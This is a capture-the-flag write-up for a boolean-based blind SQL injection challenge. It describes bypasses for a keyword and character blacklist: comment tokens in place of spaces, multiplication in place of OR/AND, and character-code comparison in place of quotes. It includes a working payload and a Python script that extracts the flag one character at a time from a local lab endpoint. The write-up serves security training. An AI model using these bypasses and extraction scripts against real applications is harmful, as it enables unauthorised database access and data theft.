🔍 Vulnerability Analysis
The application's code_search endpoint is vulnerable to Boolean-based Blind SQL Injection. The user input is concatenated directly into the SQL query: query = f"SELECT * FROM players WHERE id={player_id}".

However, a "Stadium Firewall" (WAF) implements a strict blacklist:

Spaces ( ): Blocked to prevent standard query separation.

Quotes (' and "): Blocked to prevent string literals.

Keywords: OR, AND, UNION are blocked (case-insensitive).

🛡️ Exploitation & Bypasses
1. Space Bypass
Standard spaces are replaced with Multi-line comments (/**/), which SQLite treats as whitespace.

2. Logic Keyword Bypass
Since OR and AND are blocked, we use mathematical or symbolic logic. While the pipe operator (||) often works for concatenation, the most reliable method in this specific environment is Multiplication Logic.

id=1*(CONDITION)

If the condition is True, the query becomes WHERE id=1, returning a "Registered" message.

If the condition is False, the query becomes WHERE id=0, returning "Not Found".

3. Quote Bypass
To check characters without using quotes, we use the unicode() and substr() functions to compare the character's decimal ASCII value directly against an integer.

🚀 The Exploit String
The final payload used to leak the first character (ASCII 73 for 'I') looks like this: 1*(SELECT/**/unicode(substr(flag,1,1))==73/**/FROM/**/secret_scout_notes)

🐍 Automated Solver
The following Python script automates the extraction process by iterating through each character position and testing all printable ASCII values.

import requests

URL = "http://127.0.0.1:8005/code_search"
FLAG = ""

print("[*] Extraction started using Multiplication Bypass...")

for i in range(1, 40):
    found_char = False
    for code in range(32, 127):
        # We use the exact logic from the successful curl
        # No spaces, no quotes, no blacklisted words
        payload = f"1*(SELECT/**/unicode(substr(flag,{i},1))=={code}/**/FROM/**/secret_scout_notes)"
        
        try:
            # We construct the URL manually to ensure it remains raw
            r = requests.get(f"{URL}?id={payload}", timeout=5)
            
            # Check for the green success message
            if "Registered" in r.text:
                FLAG += chr(code)
                print(f"[+] Found char {i}: {FLAG}")
                found_char = True
                break
        except Exception as e:
            print(f"\n[!] Connection Error: {e}")
            break
            
    if not found_char:
        break

print(f"\n[!] Success! Final Flag: {FLAG}")



🏁 Flag
INFODAYS{SQLI_CH4R_N0_5P4C3_2026}
